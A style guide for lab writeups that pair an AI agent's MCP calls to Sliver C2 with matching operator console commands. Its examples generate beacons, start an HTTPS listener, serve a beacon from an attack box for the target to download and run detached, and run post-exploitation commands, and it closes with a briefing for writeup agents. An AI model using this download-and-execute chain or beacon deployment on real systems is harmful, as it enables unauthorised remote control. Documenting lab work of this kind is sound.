# Writeup format: Sliver paired blocks

Lab writeups that include Sliver C2 steps use a **paired-block** structure: an
MCP tool call on the left (AI workflow) paired with a human-readable operator
instruction on the right (console equivalent / human replication path).

```
MCP call                           | Console equivalent
-----------------------------------|------------------------------------------
mcp__sliver__generate_beacon(      | Generate a Linux x86 HTTPS beacon:
    c2_host="10.10.14.5",          |   sliver > generate beacon \
    os="linux",                    |     --http 10.10.14.5:443 \
    arch="386",                    |     --os linux --arch 386
    protocol="https",              |   Transfer to target and run detached:
)                                  |   nohup setsid ./beacon </dev/null \
                                   |     >/dev/null 2>&1 &
```

---

## The two columns serve different readers

| Column | Reader | Purpose |
|---|---|---|
| MCP call | AI agent / engineer reviewing AI workflow | Exact tool invocation for replay via the MCP |
| Console equivalent | Human operator / writeup reader | How a hands-on-keyboard operator replicates the step |

**They document the same action in two different registers.** They are not a
translation table — MCP parameters do not map mechanically to CLI flags.

---

## What the console column is NOT

The console column must **not** be a parameter-for-parameter transcription of
the MCP call into Sliver CLI syntax:

```
# WRONG — this is a parameter map, not an operator instruction
generate beacon --http 10.10.14.5:443 --os linux --arch 386 --format executable
```

A parameter map adds no information for a human reader and obscures intent.
It is also often incomplete: the MCP call may include pool-reuse logic, pool
eviction, and listener startup that a single `generate beacon` command cannot
replicate without context.

---

## What the console column IS

The console column is what a skilled human operator would **actually type or do**
to accomplish the same result, written as a terse but complete instruction:

- Skip obvious details; include non-obvious ones (port, detachment method, etc.)
- Use the Sliver CLI's natural phrasing where applicable
- Add context the MCP hides: file staging, detachment command, timing, etc.

### Examples

**Listener setup**

```
MCP: mcp__sliver__start_https_listener(port=443)

Console: Start an HTTPS listener on port 443:
  sliver > https -l 0.0.0.0 -p 443
```

**Beacon generation and pool reuse**

```
MCP: mcp__sliver__regenerate_or_build(
         c2_host="10.10.14.5", protocol="https",
         os="linux", arch="amd64")

Console: Regenerate the linux/amd64 pool beacon against the current LHOST
  or compile fresh if no matching build exists:
  sliver > regenerate pool-https-linuxamd64
  (if absent: generate beacon --http 10.10.14.5:443 --os linux --arch amd64
              --name pool-https-linuxamd64)
```

**Beacon delivery (Linux)**

```
MCP: mcp__sliver__upload(target_id, "/tmp/beacon", beacon_bytes)
     + execute_command(target_id, "nohup setsid /tmp/beacon ...")

Console: Serve beacon from attack box and download+execute on target:
  attack$  python3 -m http.server 8080
  target$  wget http://10.10.14.5:8080/beacon -O /tmp/beacon
  target$  chmod +x /tmp/beacon
  target$  nohup setsid /tmp/beacon </dev/null >/dev/null 2>&1 &
```

**Post-exploitation command**

```
MCP: mcp__sliver__execute_command(session_id, "whoami /all")

Console: Run whoami in the Sliver session:
  sliver (BEACON) > execute whoami /all
```

---

## Writing the console column: quick checklist

- [ ] Written for a human, not parsed from MCP parameters
- [ ] Shows the Sliver CLI command or shell command that a KBO would type
- [ ] Includes any file-staging step, detachment method, or timing note that
      the MCP handles internally but the human would have to do manually
- [ ] Does **not** enumerate every MCP parameter as a CLI flag
- [ ] Uses natural Sliver CLI phrasing (e.g. `https -l 0.0.0.0 -p 443`, not
      `start_https_listener(host="0.0.0.0", port=443)`)

---

## Briefing note for writeup agents

When generating a Sliver writeup section with paired blocks:

> The **console column** is the human replication path — what a skilled operator
> would type at a keyboard to achieve the same result. It is **not** a parameter
> map from the MCP call. Write it as a terse operational instruction with the
> Sliver CLI command or shell snippet a human would actually run, plus any
> non-obvious context (transfer method, detachment, etc.). The MCP call already
> documents the AI workflow; the console column adds the human perspective.
